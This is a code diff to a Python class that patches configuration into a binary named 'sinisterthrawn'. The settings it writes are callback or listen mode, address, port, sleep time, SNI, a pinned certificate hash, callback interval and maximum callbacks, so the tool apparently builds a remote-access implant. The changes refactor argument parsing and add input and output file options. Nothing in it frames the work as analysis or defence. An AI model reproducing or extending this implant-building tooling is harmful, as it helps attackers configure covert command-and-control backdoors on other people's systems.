@@ -43,6 +43,8 @@ class Patcher:
         self.sni: Optional[str] = None 
         self.interval : int = 0
         self.max_cb : int = 0
+        self.infile : Optional[Path] = None
+        self.outfile : Optional[Path] = None
 
     def _hash_spki(self) -> Optional[bytes]:
         """SHA256 hashes server's spki from public certificate"""
@@ -165,7 +167,7 @@ class Patcher:
 
         return patch 
 
-    def parse_stamper_args(self, args: list, str_usage: str) -> Optional[argparse.Namespace]:
+    def _parse_stamper_args(self, args: list, str_usage: str) -> bool:
         """parses required arguments for stamping sinister thrawn binary"""
 
         parser = argparse.ArgumentParser(
@@ -231,53 +233,71 @@ class Patcher:
             default=3,
         )
 
+        # infile and outfile 
+        parser.add_argument(
+            "--infile",
+            type=Path,
+            required=True,
+            help="Non-stamped sinisterthrawn binary",
+        )
+        parser.add_argument(
+            "--outfile",
+            type=Path,
+            required=True,
+            help="Path to write stamped sinisterthrawn binary",
+        )
+
         try:
             parsed_args = parser.parse_args(args)
         except argparse.ArgumentError as error:
             self.log.info(error)
-            return None
+            return False
 
         except SystemExit:
-            return None
+            return False
 
         if parsed_args.callback and parsed_args.listen != IPv4Address("0.0.0.0"):
             self.log.info(
                 "stamped binary must have only one specified mode, ie --callback or --listen"
             )
-            return None
+            return False
 
         if not 1 <= parsed_args.port <= 65535:
             self.log.info(f"port {parsed_args.port} out of range [1-65535]")
-            return None
+            return False
 
         if not 10 <= parsed_args.sleep <= 60:
             self.log.info(f"sleep time {parsed_args.sleep} out of range [10 - 60]")
-            return None
+            return False
 
         if not parsed_args.certs.exists() or not parsed_args.certs.is_dir():
             self.log.info(f"{parsed_args.certs} is not a valid directory")
-            return None
+            return False
+
+        if not parsed_args.infile.exists() or not parsed_args.infile.is_file():
+            self.log.info(f"{parsed_args.infile} is not a valid file")
+            return False  
 
         if parsed_args.callback:            
             if len(parsed_args.callback) > self.MAX_ADDR_LEN:
                 self.log.info(f"{parsed_args.callback} exceeds maximum length of {self.MAX_ADDR_LEN}")
-                return None
+                return False
 
             if not parsed_args.sni:
                 parsed_args.sni = parsed_args.callback
             elif len(parsed_args.sni) > self.MAX_SNI_LEN:
                 self.log.info(f"{parsed_args.sni} exceeds maximum length of {self.MAX_SNI_LEN}")
-                return None
+                return False
 
             if not 5 <= parsed_args.interval <= 1440:
                 self.log.info(f"interval {parsed_args.interval} out of range [5-1440]")
-                return None
+                return False
 
             if not 3 <= parsed_args.max <= 30:
                 self.log.info(
                     f"maximum number of callbacks {parsed_args.max} out of range [3-30]"
                 )
-                return None
+                return False
 
             self.mode = Mode.CALLBACK
             self.address = parsed_args.callback
@@ -292,13 +312,18 @@ class Patcher:
         self.port = parsed_args.port 
         self.sleep = parsed_args.sleep
         self.certs_dir = parsed_args.certs
+        self.infile = parsed_args.infile
+        self.outfile = parsed_args.outfile
 
-        return parsed_args
+        return True
 
-    def patch_binary(self, infile: Path, outfile: Path) -> bool:
+    def patch_binary(self, args: list, str_usage: str) -> bool:
+
+        if not self._parse_stamper_args(args, str_usage):
+            return False
 
         try:
-            with open(infile, "rb") as f:
+            with open(self.infile, "rb") as f:
                 data = f.read()
         except (PermissionError, FileNotFoundError) as error:
             self.log.info(error)
@@ -309,7 +334,7 @@ class Patcher:
             self.log.info("pattern was not found within specified infile")
             return False
 
-        self.log.debug(f"Source: {infile.name} -- Size: {len(data)} -- Pattern Index: {index}")
+        self.log.debug(f"Source: {self.infile.name} -- Size: {len(data)} -- Pattern Index: {index}")
 
         spki = self._hash_spki()
         if spki is None:
@@ -332,13 +357,18 @@ class Patcher:
         patched_data = data[:index] + patch + pad_bytes + data[index + len(self.BINARY_PATCH):]
 
         try: 
-            with open(outfile, "wb") as new_file:
+            with open(self.outfile, "wb") as new_file:
                 new_file.write(patched_data)
         except (PermissionError, OSError) as write_error:
             self.log.info(write_error)
             return False
 
-        self.log.info(f"Patched binary written to {outfile}")
-        self.log.debug(f"Patch Size: {len(patch)} --- Padding bytes: {len(pad_bytes)}")
+        self.log.info(f"Patched binary written to {self.outfile}")
+
+        self.log.debug(
+            f"Config -- Mode: {self.mode.name} | Address: {self.address} | Port: {self.port} | "
+            f"Sleep: {self.sleep}s | SNI: {self.sni} | Interval: {self.interval}m | "
+            f"Max Callbacks: {self.max_cb} | Patch Size: {len(patch)} | "
+            f"Padding: {len(pad_bytes)} | Infile: {self.infile} | Outfile: {self.outfile}")
 
         return True
